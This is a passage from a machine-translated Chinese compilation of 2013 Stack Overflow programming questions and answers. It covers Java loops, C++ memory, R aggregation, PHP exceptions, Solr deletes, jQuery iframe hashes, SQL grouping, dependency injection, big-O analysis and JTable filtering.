使用别名 ( `"base64"`)、Python < 3.2 或`bytes.decode`所有似乎都失败了。

# java - 如何在java中的代码中达到所需的点？

> ID：16122438
> 
> 赞同：-1
> 
> 时间：2013-04-20T16:10:29.877
> 
> 标签：java

我想制定一个获得成绩的逻辑。我继续使用`Scanner`该类从用户那里获取总分作为输入，然后我正在验证分数是否介于`0`和`100`（包括两者）之间。

现在，如果标记不在此范围内，我打印“输入有效标记！！”，我希望它转到上一步并再次要求用户输入。

```
import java.util.Scanner;
class Performance
{
    public static void main(String[] aa)
    {
        Scanner scnr = new Scanner(System.in);
        System.out.println("Enter the marks :"); // Line 7
        int marks= scnr.nextInt();
        if(marks<0 || marks>100)
        {
            System.out.println("Enter valid marks!!");
        }
    // Now if this condition is true then I want the control to go again to line 7
    // Please suggest me the way to Proceed
    }
} 
```

请建议在上述代码中进行修改的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:13:06.063

请参阅[此链接](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/while.html)。

你想做这样的事情：

```
do {
   code line 1;
   code line 2;
   code line 3;
} while(yourCondition); 
```

现在，如果`yourCondition`满足，代码将`code line 1`再次转到（将执行 和 之间的代码块`do`）`while`。

现在，在您了解它的工作原理之后，您可以轻松地将其应用到您的任务中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:12:25.187

尝试这个：

```
boolean b = true;
while(b){

    if(marks<0 || marks>100){
        System.out.println("Enter valid marks!!");
        marks= scnr.nextInt();
     }

     else{
         b= false;
        //Do something
     }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T16:16:42.573

```
Scanner scnr = new Scanner(System.in);
do {
    System.out.println("Enter the marks :"); // Line 7
    int marks= scnr.nextInt();
    if(marks<0 || marks>100)
    {
        System.out.println("Enter valid marks!!");
    } else
        break;
} while (true); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-21T10:50:56.117

谢谢大家帮助。最后我按照以下方式进行：

```
 public static void main(String[] aaa)
 {

int counter=0;
Scanner scnr = new Scanner(System.in);
int marks;
do
{
    counter++;
    System.out.println("Enter the marks :");

    marks= scnr.nextInt();
    if(marks<0 || marks>100)
    {
        System.out.println("Marks entered are not        valid");
        if(counter>=3)
        {
            System.out.println("You have exceeded the maximum number of attempts!!");
            System.exit(1);
        }
        else
            System.out.println("Enter valid marks!!");

    }
    else
        break;
} while(true);
 } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-20T16:17:28.407

```
8     int marks = scnr.nextInt();
9     while(marks<0 || marks>100)
10    {
11        System.out.println("Enter valid marks!!");
12        System.out.println("Enter the marks :");
13        marks = scnr.nextInt();
14    } 
```

# c++ - 类中的指针/释放内存

> ID：16122444
> 
> 赞同：1
> 
> 时间：2013-04-20T16:11:33.777
> 
> 标签：c++, pointers, memory

这可能是指针 101 ......但奇怪的是（对我来说）很难找到答案。

在下面的示例中，所有内容都会自动正确删除还是我必须手动删除一些？这`Test t`也包括...

我的回答是肯定的，除非我明确使用，否则一切都会被释放，`new`但我还不确定。

谢谢。

```
#include <iostream>
#include <vector> 

class Obj
{
    public:
        Obj(int num) : m_num(num) {}

        int getNum() { return m_num; }

    private:
        int m_num;
};

class Test
{
    public:
        Test(Obj *po) : m_po(po) {}

        void print()
        {
            std::cout << m_po->getNum() << std::endl;
        }

    private:
        Obj *m_po;
};

class Test2
{
    public:
        Test2() {}

        void add(Obj &o)
        { m_vo.push_back(&o); }

        void print()
        {
            for (size_t i=0; i<m_vo.size(); ++i)
                std::cout << m_vo[i]->getNum() << std::endl;
        }

    private:
        std::vector<Obj*> m_vo;
};

int main(int argc, char** argv) 
{
    Obj o1(1);
    Obj o2(2);
    Test t(&o1);
    t.print();

    Test2 t2;
    t2.add(o1);
    t2.add(o2);
    t2.print();

    //Would there be other uses of those objects t and t2 that could require a manual delete () ?

  return(0);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:13:31.440

你的分析是准确的。您没有使用`new`or`malloc`或等价物。所以你不负责释放任何东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T16:14:18.333

是的，一切都会被正确地销毁和释放，因为那里的所有对象都有*自动存储期限。*只有具有*动态存储持续时间*的对象（由`new`or创建的对象`new[]`）需要手动（分别由`delete`or ）释放`delete[]`。

# r - 如何找到每个分类变量的连续变量的平均值

> ID：16122452
> 
> 赞同：0
> 
> 时间：2013-04-20T16:12:56.730
> 
> 标签：r

我想在 y 轴上绘制连续 BMI，在 x 轴上绘制家庭收入的分类变量，我希望该图可以绘制每个类别的平均 BMI。但是，我不确定如何找到家庭收入每个因素的平均 BMI。

```
Dataset nh  (5994 total IDs with Observations) (Parts of the 2009-2010 NHANES Dataset)
> dput(head(nh))
structure(list(SeqN = c(51624L, 51628L, 51629L, 51630L, 51633L, 51635L), 
Gender = c(1L, 2L, 1L, 2L, 1L, 1L), Age = c(34L, 60L, 26L, 49L, 80L, 80L), 
Ethnicity = c(3L, 4L, 1L, 3L, 3L, 3L), FamSize = c(4L, 2L, 5L, 3L, 2L, 1L),
RatioIncomePoverty = c(1.36, 0.69, 1.01, 1.91, 1.27, 1.69), 
MECWgt2 = c(81528.77201, 21000.33872, 22633.58187, 74112.48684, 12381.11532, 22502.50666),
BMI = c(32.22, 42.39, 32.61, 30.57, 26.04, 27.62), 
LengthUS = c(NA_integer_, NA_integer_, NA_integer_, NA_integer_, NA_integer_,NA_integer_),
Education = c(3L, 3L, 2L, 4L, 4L, 2L), LocationBorn = c(1L, 1L, 1L, 1L, 1L, 1L), 
FamIncome = c(6L, 3L, 6L, 7L, 4L, 4L)), .Names = c("SeqN", 
"Gender", "Age", "Ethnicity", "FamSize", "RatioIncomePoverty", 
"MECWgt2", "BMI", "LengthUS", "Education", "LocationBorn", "FamIncome"), 
row.names = c(NA, 6L), class = "data.frame")

faminc <- as.character(nhanes$FamIncome)
faminc 
```

任何有关如何对数据建模以实现此目标的建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T19:18:17.607

这可能有效：

```
 library(plyr)
    nhh<-ddply(nh,.(famIncome), summarise, mean.bmi=mean(bmi)) # find mean bmi
    with(nhh, plot(famIncome,mean.bmi)) # simple plot 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-21T12:53:43.193

这是使用的基本解决方案`aggregate`：

```
a <- aggregate(BMI ~ FamIncome, data=nh, FUN=mean)
barplot(a$BMI, names.arg=a$FamIncome) 
```

![在此处输入图像描述](https://i.stack.imgur.com/7ZftP.png)

# php - php中的异常处理问题

> ID：16122455
> 
> 赞同：2
> 
> 时间：2013-04-20T16:13:12.100
> 
> 标签：php, exception

我正在为我的项目尝试 PHP 异常。但事实证明，异常被成功抛出，但没有被我写的代码成功捕获。

**编码：**

```
 try{
    require_once(MASTER_PHP."/master_validation.php");
    require_once(MASTER_PHP."/master_user.php");
    require_once(MASTER_PHP."/master_db.php");  require_once(MASTER_PHP."/master_secure.php");
    require_once(MASTER_PHP."/master_ui.php");
    require_once(MASTER_PHP."/master_mail.php");
    require_once(MASTER_PHP."/master_filehandling.php");
    require_once(MASTER_PHP."/master_archive.php");
    require_once(MASTER_PHP."/master_date.php");
    require_once(MASTER_PHP."/master_social.php");
    require_once(MASTER_PHP."/master_message.php");
    require_once(MASTER_PHP."/master_gallery.php");
    require_once(MASTER_PHP."/master_backup.php");
    require_once(MASTER_PHP."/master_payment.php");
    require_once(MASTER_PHP."/master_sms.php");
    require_once(MASTER_PHP."/master_xml.php");

    $filterobj=new ta_filtervalue();
    $filterobj->filterrequest();

    global $noecho;
    if($noecho!="yes")
    {
        $utilityobj=new ta_utilitymaster();
        $utilityobj->includeextassets();
    }
}
catch (Exception $e)
{
    $custerrcode=$e->getMessage();
$dbobj=new ta_dboperations();
$res=$dbobj->dbquery("SELECT * FROM ".ERROR_CODES." WHERE ".errordb_errcode."='$custerrcode' LIMIT 0,1",DB_ERROR);

$errmsg=$res[0][changesqlquote(errordb_errdesc,"")];
$errpriority=$res[0][changesqlquote(errordb_errpriority,"")];
$errcallback1=$res[0][changesqlquote(errordb_errcallback1,"")];
$errcalltext1=$res[0][changesqlquote(errordb_errcallbacktext1,"")];
$errcallback2=$res[0][changesqlquote(errordb_errcallback2,"")];
$errcalltext2=$res[0][changesqlquote(errordb_errcallbacktext2,"")];
$errtitle=$res[0][changesqlquote(errordb_errtitle,"")];

$errobj=new ta_errorhandle();
$errobj->senderror($errmsg,$custerrcode,$errpriority,$errcallback1,$errcalltext1,$errcallback2,$errcalltext2,$errtitle);
} 
```

如果异常发生在`master_user.php`（所需文件）中，则必须在需要它的文件中捕获它。但它没有捕捉到异常。

我抛出异常的方式：

```
throw new Exception('#ta@0000000_0000000'); 
```

其中里面的字符串是错误代码。

错误信息：

```
Fatal error: Uncaught exception 'Exception' with message '#ta@0000000_0000000' in 
C:\xampp\htdocs\techahoy\securedir\phpmaster\master_user.php:19 Stack trace: #0 
C:\xampp\htdocs\techahoy\login\profile.php(4): ta_userinfo->userinit() #1 {main} thrown in
C:\xampp\htdocs\techahoy\securedir\phpmaster\master_user.php on line 19 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:37:08.520

看起来（几乎）和[这里](https://stackoverflow.com/questions/5369488/try-catch-cannot-work-with-require-once-in-php)一样。

> require() 与 include() 相同，但失败时也会产生致命的 E_COMPILE_ERROR 级别错误。换句话说，它将**停止**脚本

# solrj - 有没有办法使用 solrj 删除 solr 中只有一行的索引

> ID：16122456
> 
> 赞同：-2
> 
> 时间：2013-04-20T16:13:14.047
> 
> 标签：solrj

我做了一个 java 应用程序，可以索引我的最后一行（这就是我的 wabt）

但是现在我问这个角色的索引是否有任何意义！你能给我指示如何做到这一点，或者简单的代码来改变我的代码吗？

```
;
public class indexSolr {
    private  Connection conn = null;
    private static HttpSolrServer  server;
      private Collection docs = new ArrayList();
      private int _totalSql = 0;
      private long _start = System.currentTimeMillis();

    public static void main(String[] args) throws SolrServerException, IOException, SQLException
    { String url = "http://localhost:8983/solr/db";

                   indexSolr idxer = new indexSolr(url);

  idxer.doSqlDocuments();

  idxer.endIndexing();

     }

    private void doSqlDocuments() throws SQLException {

        try {
            Class.forName("org.postgresql.Driver");

            conn = DriverManager.getConnection(
                    "jdbc:postgresql://localhost:5432/biz_cat",
                    "postgres", "pos");
            java.sql.Statement st = null;
           st = conn.createStatement();
           ResultSet rs =   st.executeQuery("select * from pl_biz order by id DESC LIMIT 1");

          while (rs.next()) {

            SolrInputDocument doc = new SolrInputDocument();

            Integer  id = rs.getInt("id");
            String name = rs.getString("name");
            String midname = rs.getString("midname");
            String lastname = rs.getString("lastname");
            String frlsname = rs.getString("frlsname");
            String biz_subject = rs.getString("biz_subject");
            String company_type = rs.getString("company_type");
            String obshtina = rs.getString("obshtina");
            String main_office_town = rs.getString("main_office_town");
            String address = rs.getString("address");
            String role = rs.getString("role");
            String country = rs.getString("country");
            String nace_code = rs.getString("nace_code");
            String nace_text = rs.getString("nace_text");
            String zip_code = rs.getString("zip_code");
            String phone = rs.getString("phone");
            String fax = rs.getString("fax");
            String email = rs.getString("email");
            String web = rs.getString("web");
            String location = rs.getString("location");
            String geohash = rs.getString("geohash");
            Integer popularity = rs.getInt("popularity");

            doc.addField("id", id);
            doc.addField("name", name);
            doc.addField("midname", midname);
            doc.addField("lastname", lastname);
            doc.addField("frlsname", frlsname);
            doc.addField("biz_subject", biz_subject);
            doc.addField("company_type", company_type);
            doc.addField("obshtina", obshtina);
            doc.addField("main_office_town", main_office_town);
            doc.addField("address", address);
            doc.addField("role", role);
            doc.addField("country", country);
            doc.addField("nace_code", nace_code);
            doc.addField("nace_text", nace_text);
            doc.addField("zip_code", zip_code);
            doc.addField("phone", phone);
            doc.addField("fax", fax);
            doc.addField("email", email);
            doc.addField("web", web);
            doc.addField("location", location);
            doc.addField("geohash", geohash);
            doc.addField("popularity", popularity);

            docs.add(doc);
             ++_totalSql;

            if (docs.size() > 1) {
                 // Commit within 5 minutes.
                UpdateResponse resp = server.add(docs);
                System.out.println (resp);
              if (resp.getStatus() != 0) {
                log("Some horrible error has occurred, status is: " +
                      resp.getStatus());
              }
              docs.clear();
            }
          }
        }
        catch (Exception ex)
        {
          ex.printStackTrace();
        }
        finally {
          if (conn != null) {
            conn.close();
          }
        }

    }

     private void endIndexing() throws IOException, SolrServerException {
            if (docs.size() > 0) { // Are there any documents left over?
              server.add(docs, 300000); // Commit within 5 minutes
            }
            try 
            {
            server.commit(); 

            }
            catch (Exception ex)
            {

                ex.printStackTrace();
            }

            long endTime = System.currentTimeMillis();
            log("Total Time Taken: " + (endTime - _start) +
                 " milliseconds to index " + _totalSql +
                " SQL rows" );
          }

          private indexSolr(String url) throws IOException, SolrServerException {
              // Create a multi-threaded communications channel to the Solr server.
          try {    
            server = new HttpSolrServer(url);

            server.setSoTimeout(1000);  // socket read timeout
            server.setConnectionTimeout(1000);
            server.setMaxRetries(1); 

          }
               catch (Exception ex)
               {

                   ex.printStackTrace();

               }
          }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T13:24:42.880

这就是从 solr 中删除 id 为 30682 的行的索引所需要做的全部工作

```
SolrServer solrServer;
            String url = "http://localhost:8983/solr/db";
            solrServer = new HttpSolrServer(url);
            solrServer.deleteByQuery("id:30682");
            solrServer.commit();
            System.out.println("index deleted"); 
```

我希望它可以帮助某人

# javascript - 在带有哈希链接的 iframe 中运行 jquery 函数

> ID：16122462
> 
> 赞同：0
> 
> 时间：2013-04-20T16:14:18.727
> 
> 标签：javascript, jquery, html

我可以使用哈希链接在 iframe 中运行 jquery 函数吗？也许是这样的：

父代码：

```
<a href="#runFunction" target="iframe">run function in iframe</a>
<iframe src="pageName.html" name="iframe"></iframe> 
```

框架代码：

```
$(document).ready(function(){
$('body').the parent link is clicked, changing the url to pageName.html#runFunction (function(){
//blah blah blah//
});
}); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:33:34.863

是的，您可以使用 hashchange 事件。只要你不介意不支持 IE7 [http://caniuse.com/hashchange](http://caniuse.com/hashchange)

或者，还有一个插件可以为您回填：http: [//benalman.com/projects/jquery-hashchange-plugin/](http://benalman.com/projects/jquery-hashchange-plugin/)

在父页面上，只需将 iframe 的 URL 更改为新的哈希值。

```
$("iframe").prop("src", "http://google.com/#newhash"); 
```

然后在 iframe 页面的文档中：

```
$(window).bind("hashchange", function() {
    alert(window.location.hash);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:46:04.213

我不确定你在这里尝试什么......但你可以试试这个：

其中“myIFrameFunction”是“pageName.html”中的一个函数...

父 HTML：

```
<a href="#myIFrameFunction" target="iframe">click me for win</a>
<iframe src="pageName.html"></iframe> 
```

iframe Javascript（只要要调用的函数是全局声明的[直接在脚本标签或js文件中]）：

```
function testHash() {
    var hash = window.location.hash.split('#')[1];
    if ( typeof window[hash] != 'undefined' ) {
        window[hash]();
    }
}

var myTimer = setInterval(testHash, 100);

function myIFrameFunction() {
    alert('It Works!');
} 
```

# sql - 分组依据来自文本列的数据

> ID：16122465
> 
> 赞同：1
> 
> 时间：2013-04-20T16:14:47.227
> 
> 标签：sql, tsql, group-by

我在存储发票数据的数据库中有一个表。我希望轻松查看有关某项操作何时发生的每日统计信息。当执行该操作时，一条注释会添加到该表中名为“notes”的列中，格式如下：“ORDER FILLED -G J- Apr 20 2013”​​。“G J”是执行我要跟踪的操作的人的首字母。在该注释之前和之后可以有其他注释。不幸的是，此操作仅记录在数据库中的这一位置，我无法控制数据的记录方式。我希望创建一份关于每个用户昨天执行此操作的次数的每日报告。下面的查询完美地工作，但是它将每个用户的结果作为单独的结果返回，我认为它们都在一个网格中。我不是程序员或 SQL 专家，我只是想一起解决一些可行的问题。有没有一种简单的方法来修改下面的查询，以便我可以有一个包含两列的表...第 1 列应该是“用户”，第 2 列应该是“订单填充”我想为每个员工设置一行，如何他们多次执行该动作，最后一排总计。

```
declare @date VARCHAR(12)

SET @date = (SELECT CONVERT(VARCHAR(12), GETDATE()-1, 100))

select count(invoice_id) as Employee1 from invoice 
where notes like '%ORDER FILLED -G J- '+@date+'%'

select count(invoice_id) as Employee2 from invoice 
where notes like '%ORDER FILLED -S L- '+@date+'%'

select count(invoice_id) as Employee3 from invoice 
where notes like '%ORDER FILLED -E S- '+@date+'%'

select count(invoice_id) as Employee4 from invoice 
where notes like '%ORDER FILLED -R A- '+@date+'%'

select count(invoice_id) as Total from invoice 
where notes like '%ORDER FILLED -% %- '+@date+'%' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:21:49.417

像这样的东西可能会起作用

```
select substring(notes, 13, 4) filledby -- should be -G J- if I counted right
, count(*) records
from invoice
where notes like '% ' + @date + '%'
group by substring(notes, 13, 4) 
```

请注意，不同的 RDBMS 对子字符串有不同的语法，并且您没有指定您的语法。

# oop - 使用 Service Locator 反模式和使用 Castle Windsor 容器有什么区别？”

> ID：16122466
> 
> 赞同：7
> 
> 时间：2013-04-20T16:14:54.663
> 
> 标签：oop, inversion-of-control, castle-windsor, service-locator

最近，我一直在尝试了解使用服务定位器“反模式”和使用 Castle Windsor 容器之间的区别。[我在 Internet 上到处找到一些信息，并在一篇未完成的博客文章](http://1000linesofcode.wordpress.com/2013/02/05/dependencies-management/)中总结了我迄今为止所学到的知识。

编辑：到目前为止，我一直认为依赖注入是保证分离所需要的。但无论我看哪里，我都看到了向温莎城堡等集装箱方向发展的趋势。我想清楚地了解原因。请...[向我解释一下，就像我是 6 岁](https://www.youtube.com/watch?v=e-Pj2GfdkSc):)

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-23T18:25:33.003

有趣的是，您应该像六岁一样要求对其进行解释；这是一个[像你五岁的解释](https://stackoverflow.com/a/1638961/126014):)

> 在我所见的任何地方，我都看到朝着温莎城堡等集装箱的方向推进

坦率地说，我认为这样做的原因是大多数人实际上并不了解依赖注入是什么，这意味着他们没有掌握控制反转的概念，而是去寻找`new`他们已经习惯的关键字的替代品. 然后他们找到一个 DI 容器并（错误地）将其用作服务定位器。不幸的是，这很容易做到。

这就是为什么在[我的书中](https://rads.stackoverflow.com/amzn/click/com/1935182501)，我解释了所有 DI 概念，而没有将解释耦合到任何单个 DI 容器。这实际上是本书的大部分内容。

服务定位器和依赖注入是[实现松耦合的两种根本不同的尝试](http://www.infoq.com/articles/Succeeding-Dependency-Injection)。Service Locator 有很多缺点，并且没有 DI 不具备的优点。这就是为什么我认为将 Service Locator 称为反模式是安全的。

使用 DI 不需要 DI 容器；事实上，我会说[除非你采取一种相当复杂的方法，否则最好避免使用](http://blog.ploeh.dk/2012/11/06/WhentouseaDIContainer).

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-21T14:52:01.007

当您使用服务定位器时，您的代码会在任何地方为服务调用定位器。当您使用控制反转时，只有一个地方（组合根），您调用容器。你的应用程序的其余部分不应该是容器感知的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-20T16:22:49.653

好吧，服务定位器可能只是围绕特定反转控制容器（例如 Castle Windsor）的包装器。关键是您的代码应该（理想情况下）引用容器的唯一位置是您的[组合根](http://blog.ploeh.dk/2011/07/28/CompositionRoot/)。

因为控制容器的反转支持依赖链，所以当您从容器解析根类型时，它的所有依赖项以及任何后代依赖项都将被注入。

如果您希望在运行时创建更多类型，那么您可以使用工厂，如果您希望利用容器提供的依赖链以及接口与实现的容器映射，它也可以引用您的容器。

# big-o - 不相交寻边算法分析

> ID：16122468
> 
> 赞同：0
> 
> 时间：2013-04-20T16:14:59.180
> 
> 标签：big-o, analysis, graph-algorithm

我有一种算法可以在无向图中找到一组边不相交的路径。

1.  从图中所有边的列表开始

2.  当列表中仍有可用边时，执行深度/广度优先搜索以找到路径。如果找到路径，保存它，从列表和图形中删除边并增加路径计数器

3.  从列表中删除第一个可用边并将其指定为当前路径

4.  尝试将当前路径与已保存边缘列表匹配

5.  如果没有可用的边缘匹配，则路径完成

6.  如果可用边可以扩展当前路径，则将其添加到当前路径并从边列表中删除，然后继续尝试扩展当前路径。

我相信 2 和 3 在 O(E(V+E) + E) 时间内执行，因为

*   广度/深度优先搜索在 O(V+E) 时间内执行
*   搜索在列表中的 E 条边上执行
*   从列表和图形中删除 E 边

由于迭代边缘列表需要两个循环，算法的后半部分在 O(E^2) 时间内执行。

因此，我有一个最后的最坏情况 O(E(V+E)+ E^2+E)=O(EV+2E^2+E)

我对吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T11:40:22.220

不，这是不对的。据我了解您的问题 O(E(V+E)+ E^2+E) 是正确的。但在大 O 表示法中，人们会因为复杂性而选择“最大”事件。您在其中具有三个复杂性类：

1.  E(V+E)
2.  E^2
3.  乙

第 3 点被第 2 点消除了，因为在任何情况下 2 都更大。在“最坏情况”中，E 是 V^2。知道了这一点，您可以确定第 1 点是最大复杂性部分（V^3+V^4 > V^4）。你的算法是正确的，你对零件的假设也是正确的，所以这个问题的算法复杂度是：**O(E(V+E))**

你可以看看这些[幻灯片](http://www.informatik.uni-augsburg.de/thi/personen/lei11.pdf)。在幻灯片 23 中记录了复杂性并适合您的计算；）

# java - 过滤 JTable 后的问题

> ID：16122474
> 
> 赞同：2
> 
> 时间：2013-04-20T16:16:21.837
> 
> 标签：java, swing, jtable, rowfilter

我正在处理的程序有问题。简单解释一下，我有一个包含多列和多行的 JTable。当更改值时，特定列具有可编辑的字段，其他列值会根据输入的数据而更改。一切正常，但是当我向 JTable 添加过滤器选项时，对可编辑列所做的更改不会在应用过滤器后按预期更改其他列的值。我附上了几张图片来说明这个问题。

第一个图像显示未过滤的表正常工作。更改 Discount 列的值会将存储在 GPL 列中的相应价格减少输入折扣的百分比，并显示在 SP 列的相应行中。更改 Quantity 列的值会将相应的 SP 列价格乘以输入的数量，并显示在 Total 列的相应行中。

[![未过滤的表](https://i.stack.imgur.com/TtDSp.png)](https://i.stack.imgur.com/TtDSp.png)

第二张图片显示过滤后的表格未按预期工作。更改 Discount 或 Quantity 列中的值不会更改预期的列。

[![过滤表](https://i.stack.imgur.com/p00WL.png)](https://i.stack.imgur.com/p00WL.png)

我在下面添加了包含 2 个类的 SSCCE 代码。第一个是表本身，第二个是表的侦听器。

**编辑**我已经根据 camickr 的回答更改了课程的代码，现在可以正常工作了。

TableCellChange 类

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.awt.KeyboardFocusManager;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.math.BigDecimal;
import java.math.MathContext;
import java.text.DecimalFormat;
import java.util.Locale;
import javax.swing.AbstractAction;
import javax.swing.Action;
import javax.swing.DefaultCellEditor;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.RowFilter;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableColumn;
import javax.swing.table.TableModel;
import javax.swing.table.TableRowSorter;

public final class TableCellChange extends JPanel {  

    private static JFrame frameTableCellChange;
    private JPanel panelTable, panelButtons;
    private JButton buttonResetDiscounts, buttonResetQuantities, buttonExit;
    private JTextField textFilterBox, quantityField, discountField;
    private JLabel labelFilter;
    private DefaultTableModel tableModel;
    private JTable table;
    private TableRowSorter<DefaultTableModel> sorter;
    private TableColumn columnDiscount, columnTotal, columnQuantity;
    private TableCellListener tableCellListener;
    private String checkForNull;
    private DecimalFormat decimalFormatUS;
    private Locale localeUSFormat;    
    private BigDecimal valueDiscount, valueGPL, resultDiscount, resultSP, resultTotal,
            backupDiscount = new BigDecimal("0"); 
    private int selectedColumnIndex, selectedRowIndex, valueQuantity, backupQuantity = 1;

    public TableCellChange() {

        super(); 

        panelTable = new JPanel();
        panelButtons = new JPanel();
        setLayout(new BorderLayout());

        createTable();
        createButtons();
        add(panelTable, BorderLayout.NORTH);
        add(panelButtons, BorderLayout.CENTER);

        // Always focus on the JTextField when opening the window
        SwingUtilities.invokeLater(new Runnable()  {
           @Override
           public void run() {  
               textFilterBox.requestFocusInWindow();
           }
        });
    } // -> TableCellChange()

    // Create the buttons for the query result window
    public void createButtons() {
        GridBagLayout gridbag = new GridBagLayout();
        GridBagConstraints gridcons = new GridBagConstraints();
        gridcons.fill = GridBagConstraints.HORIZONTAL;
        panelButtons.setLayout(gridbag);

        labelFilter = new JLabel("Quick search:");
        gridcons.insets = new Insets(5,0,0,0);
        gridcons.gridx = 0;
        gridcons.gridy = 0;
        gridcons.gridwidth = 2;
        gridbag.setConstraints(labelFilter, gridcons);
        labelFilter.setHorizontalAlignment(JLabel.CENTER);
        panelButtons.add(labelFilter);

        // Create text field for filtering
        textFilterBox = new JTextField();
        gridcons.insets = new Insets(5,0,0,0);
        gridcons.gridx = 0;
        gridcons.gridy = 1;
        gridcons.gridwidth = 2;
        gridbag.setConstraints(textFilterBox, gridcons);
                textFilterBox.getDocument().addDocumentListener(
                new DocumentListener() {
                    @Override
                    public void changedUpdate(DocumentEvent e) {
                        tableFilter();
                    }
                    @Override
                    public void insertUpdate(DocumentEvent e) {
                        tableFilter();
                    }
                    @Override
                    public void removeUpdate(DocumentEvent e) {
                        tableFilter();
                    }
                }); // -> DocumentListener()
        panelButtons.add(textFilterBox);

        // Create the button to reset the discount column to 0%
        buttonResetDiscounts = new JButton("Reset all discounts");
        buttonResetDiscounts.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e)
            {          
                BigDecimal valueGPL, valueTotal;
                int valueQuantity;
                for (int i = 0; i < table.getModel().getRowCount(); i++) {
                    valueGPL = new BigDecimal( table.getModel().
                            getValueAt(i, 2).toString().replaceAll("[$,]", "") );
                    table.getModel().setValueAt("0%", i, 3);   
                    table.getModel().setValueAt(DecimalFormat
                            .getCurrencyInstance(localeUSFormat).format(valueGPL), i, 4);
                    valueQuantity = Integer.parseInt( table.getModel().
                            getValueAt(i, 5).toString() );
                    valueTotal = valueGPL.multiply(new BigDecimal(valueQuantity),
                            new MathContext(BigDecimal.ROUND_HALF_EVEN));
                    table.getModel().setValueAt(DecimalFormat
                            .getCurrencyInstance(localeUSFormat).format(valueTotal), i, 6);
                }
            }
        });         
        gridcons.insets = new Insets(10,0,0,0);
        gridcons.gridx = 0;
        gridcons.gridy = 3;
        gridcons.gridwidth = 1;
        gridbag.setConstraints(buttonResetDiscounts, gridcons);
        panelButtons.add(buttonResetDiscounts);

        // Create button to reset the quantity column to 1 
        buttonResetQuantities = new JButton("Reset all quantities");
        buttonResetQuantities.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e)
            {             
                BigDecimal valueSP;
                for (int i = 0; i < table.getModel().getRowCount(); i++) {                    
                    valueSP = new BigDecimal( table.getModel().
                            getValueAt(i, 4).toString().replaceAll("[$,]", "") );
                    table.getModel().setValueAt("1", i, 5); 
                    table.getModel().setValueAt(DecimalFormat.
                            getCurrencyInstance(localeUSFormat).format(valueSP), i, 6);   
                }
            }          
        });         
        gridcons.insets = new Insets(10,0,0,0);
        gridcons.gridx = 1;
        gridcons.gridy = 3;
        gridcons.gridwidth = 1;
        gridbag.setConstraints(buttonResetQuantities, gridcons);
        panelButtons.add(buttonResetQuantities);

        // Create button for closing the window and releasing resources
        buttonExit = new JButton("Exit");
        buttonExit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e)
            {                
                System.exit(0);
            }
        }); 
        gridcons.insets = new Insets(5,0,0,0);
        gridcons.gridx = 0;
        gridcons.gridy = 5;
        gridcons.gridwidth = 2;
        gridbag.setConstraints(buttonExit, gridcons);
        panelButtons.add(buttonExit);    

    } // -> createButtons()

    // Filters the JTable based on user input
    private void tableFilter() {
        RowFilter<DefaultTableModel, Object> tableRowFilter;// = null;
        // If current expression doesn't parse, don't update
        try {
            tableRowFilter = RowFilter.regexFilter("(?i)" + textFilterBox.
                    getText(), 0, 1, 2);
        } catch (java.util.regex.PatternSyntaxException e) {
            return;
          }
        sorter.setRowFilter(tableRowFilter);       
    } // -> tableFilter

    // Method that creates the JTable
    public void createTable() {

        // Create listener for selecting all text when a text field gains focus
        KeyboardFocusManager.getCurrentKeyboardFocusManager()
        .addPropertyChangeListener("permanentFocusOwner", new PropertyChangeListener() {
        @Override
           public void propertyChange(final PropertyChangeEvent e) {
               if (e.getNewValue() instanceof JTextField) {
                   SwingUtilities.invokeLater(new Runnable() {
                       @Override
                       public void run() {
                           JTextField textField = (JTextField)e.getNewValue();
                           textField.selectAll();
                       }
                   });
               }
           }
        });

        String[] columnNames = {"Model", "Description", "GPL", "Discount", "SP",
                "Quantity", "Total"};

        Object[][] data = {
            {"MR16", "desc1", "$649.00", "0%", "$649.00", new Integer(1), "$649.00"},
            {"MR24", "desc2", "$1,199.00", "0%", "$1,199.00", new Integer(1), "1,199.00"},
            {"MR62", "desc3", "$699.00", "0%", "$699.00", new Integer(1), "$699.00"},
            {"MR66", "desc4", "$1,299.00", "0%", "$1,299.00", new Integer(1), "$1,299.00"},
